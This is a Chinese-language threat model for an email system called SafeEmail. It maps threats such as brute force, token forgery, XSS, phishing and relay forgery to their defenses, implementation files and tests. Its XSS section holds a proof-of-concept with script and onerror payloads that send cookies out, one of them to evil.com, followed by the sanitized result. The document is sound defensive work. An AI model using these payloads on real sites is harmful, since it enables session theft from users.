# SafeEmail 威胁模型与防护说明

## 1 威胁模型概述

本文档分析 SafeEmail 系统面临的安全威胁及对应防护措施。

### 攻击面分析

```
                    ┌─────────────┐
  恶意客户端 ───────>│  TCP/TLS    │
                    │  入口点     │
                    └──────┬──────┘
                           │
              ┌────────────┼────────────┐
              │            │            │
        ┌─────┴─────┐ ┌───┴───┐ ┌─────┴─────┐
        │ 认证模块  │ │邮件模块│ │ S2S 中继  │
        │           │ │       │ │           │
        │ A1-A4     │ │ B1-B5 │ │ C1-C2     │
        └─────┬─────┘ └───┬───┘ └─────┬─────┘
              │            │            │
              └────────────┼────────────┘
                           │
                    ┌──────┴──────┐
                    │  SQLite DB  │
                    │  文件存储   │
                    └─────────────┘
```

## 2 认证类威胁

### A1: 暴力破解登录

| 项目 | 说明 |
|------|------|
| 威胁 | 攻击者通过穷举密码尝试登录 |
| 风险 | 高 |
| 防护 | IP 限流 (5次/5min → 锁定15min) + 账号限流 (10次/10min → 锁定30min) + 3次失败后触发验证码 |
| 实现 | `server/auth/rate_limiter.py` |
| 测试 | `test_auth.py::TestRateLimit` |

### A2: Token 伪造/重放

| 项目 | 说明 |
|------|------|
| 威胁 | 攻击者伪造或窃取 JWT Token 冒充用户 |
| 风险 | 高 |
| 防护 | JWT HMAC-SHA256 签名验证 + Token 过期机制 (30min) + 黑名单机制（登出后 Token 立即失效）|
| 实现 | `server/auth/jwt_util.py`, `server/auth/service.py` |
| 测试 | `test_auth.py::TestSession::test_forged_token_rejected` |

### A3: 密码明文泄露

| 项目 | 说明 |
|------|------|
| 威胁 | 数据库泄露后密码被还原 |
| 风险 | 高 |
| 防护 | bcrypt 哈希 (cost=12)，不可逆，抗彩虹表 |
| 实现 | `server/auth/password.py` |
| 测试 | `test_auth.py::TestRegister` |

### A4: 弱密码

| 项目 | 说明 |
|------|------|
| 威胁 | 用户设置简单密码，易被猜测 |
| 风险 | 中 |
| 防护 | 密码策略：≥8位，必须包含大写+小写+数字 |
| 实现 | `server/auth/password.py::validate_password` |
| 测试 | `test_auth.py::test_register_weak_password_*` |

## 3 邮件类威胁

### B1: XSS 跨站脚本攻击

| 项目 | 说明 |
|------|------|
| 威胁 | 攻击者在邮件正文中注入恶意脚本 (`<script>`, `onerror` 等) |
| 风险 | 高 |
| 防护 | 发送时 HTML 清洗：移除 `<script>`/`<iframe>`/事件属性，保留安全标签 |
| 实现 | `server/security/sanitizer.py` |
| 测试 | `test_security.py::test_xss_*` (6个测试用例) |

**POC 示例：**

```html
<!-- 攻击载荷 -->
<p>Hello</p><script>fetch('/api/steal?cookie='+document.cookie)</script>
<img src="x" onerror="new Image().src='//evil.com/?d='+document.cookie">

<!-- 经过 HTMLSanitizer 清洗后 -->
<p>Hello</p>
<img src="x">
<!-- 恶意代码已被完全移除 -->
```

### B2: 钓鱼/垃圾邮件

| 项目 | 说明 |
|------|------|
| 威胁 | 攻击者发送钓鱼邮件诱导用户点击恶意链接 |
| 风险 | 中 |
| 防护 | 多维检测：URL 黑名单 + Homograph 攻击检测 + 敏感关键词评分 + 综合阈值判定 |
| 实现 | `server/security/spam_detector.py` |
| 测试 | `test_security.py::test_spam_detector_*` |

### B3: 邮件撤回伪造

| 项目 | 说明 |
|------|------|
| 威胁 | 攻击者伪造撤回请求删除他人邮件 |
| 风险 | 高 |
| 防护 | 四重校验：身份验证(仅发件人) + HMAC 签名 + 时间窗口(5min) + 幂等性 |
| 实现 | `server/mail/service.py::handle_recall_mail` |
| 测试 | `test_security.py::test_recall_forged_*`, `test_mail.py::TestRecall` |

### B4: 发送滥用/DoS

| 项目 | 说明 |
|------|------|
| 威胁 | 攻击者高频发送邮件耗尽服务器资源 |
| 风险 | 中 |
| 防护 | 滑动窗口限流：10封/min, 60封/hour + 单消息 ≤15MB |
| 实现 | `server/security/rate_limit.py` |
| 测试 | `test_security.py::test_send_rate_limit_per_minute` |

### B5: 快捷操作伪造

| 项目 | 说明 |
|------|------|
| 威胁 | 攻击者伪造快捷操作签名执行恶意操作 |
| 风险 | 中 |
| 防护 | HMAC 签名验证 + 确认/拒绝类操作需二次确认 + 链接安全检查 |
| 实现 | `server/intelligence/action_engine.py` |
| 测试 | `test_quick_action.py::TestActionEngine::test_signature_verification_fail` |

## 4 传输与中继威胁

### C1: 中间人攻击/窃听

| 项目 | 说明 |
|------|------|
| 威胁 | 攻击者窃听或篡改网络传输数据 |
| 风险 | 高 |
| 防护 | TLS 1.3 加密全部通信（客户端↔服务端、服务端↔服务端） |
| 实现 | `server/security/tls.py`, `scripts/generate_certs.py` |
| 测试 | `test_m1_tls.py` |

### C2: S2S 中继伪造

| 项目 | 说明 |
|------|------|
| 威胁 | 攻击者伪造服务器间的邮件投递/撤回请求 |
| 风险 | 高 |
| 防护 | S2S 共享密钥 HMAC 签名 + TLS 双向验证 |
| 实现 | `server/mail/relay.py` |
| 测试 | `test_relay.py` |

## 5 存储类威胁

### D1: 附件篡改

| 项目 | 说明 |
|------|------|
| 威胁 | 攻击者直接篡改服务器上的附件文件 |
| 风险 | 中 |
| 防护 | 上传时计算 HMAC-SHA256 签名，下载时重新计算比对 |
| 实现 | `server/storage/attachment.py` |
| 测试 | `test_attachment.py::TestIntegrity::test_tamper_detection` |

### D2: 跨域数据越权

| 项目 | 说明 |
|------|------|
| 威胁 | Alpha 域用户访问 Beta 域数据 |
| 风险 | 高 |
| 防护 | 每个域独立数据目录 + 路径校验禁止目录穿越 |
| 实现 | 数据目录隔离 `data/{domain}/` |
| 测试 | `test_relay.py::TestStorageIsolation` |

## 6 审计与监控

所有关键操作记录到 `audit_logs` 表：

| 操作 | 日志级别 | 记录内容 |
|------|---------|----------|
| 注册成功/失败 | INFO/WARN | 用户名、成功/失败原因 |
| 登录成功/失败 | INFO/WARN | 用户名、IP、失败原因 |
| 邮件发送 | INFO | 发件人、收件人、邮件ID、是否垃圾邮件 |
| 邮件撤回 | INFO/WARN | 发件人、邮件ID、成功/失败 |
| 限流触发 | WARN | 用户、触发类型（LOGIN_IP/LOGIN_ACCOUNT/SEND_MAIL） |
| 系统错误 | ERROR | 操作、错误信息 |

日志格式（JSON）：

```json
{
    "log_id": "uuid",
    "timestamp": "ISO8601",
    "user_id": "username",
    "action": "LOGIN",
    "ip_address": "127.0.0.1",
    "detail": "{\"success\": true}",
    "level": "INFO"
}
```

## 7 安全设计总结

| 防护层 | 措施 |
|--------|------|
| 传输层 | TLS 1.3 加密 |
| 认证层 | JWT + bcrypt + 限流 + 验证码 |
| 业务层 | HMAC 签名 + HTML 清洗 + 钓鱼检测 |
| 存储层 | 域隔离 + HMAC 完整性校验 |
| 审计层 | 全量操作日志 + 分级告警 |
